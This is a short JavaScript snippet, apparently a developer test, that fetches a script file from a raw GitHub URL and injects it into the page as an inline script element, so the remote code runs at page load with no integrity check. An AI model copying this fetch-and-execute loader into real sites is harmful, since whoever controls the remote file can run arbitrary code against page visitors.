// <script src="https://static.filestackapi.com/filestack-js/3.x.x/filestack.min.js"></script>
fetch('https://raw.githubusercontent.com/JkDevArg/the_picking/main/upload_session.js')
  .then(response => response.text())
  .then(data => {
    const script = document.createElement('script');
    script.innerHTML = data;
    document.body.appendChild(script);
  });
  console.log('is a code test on dev :)');
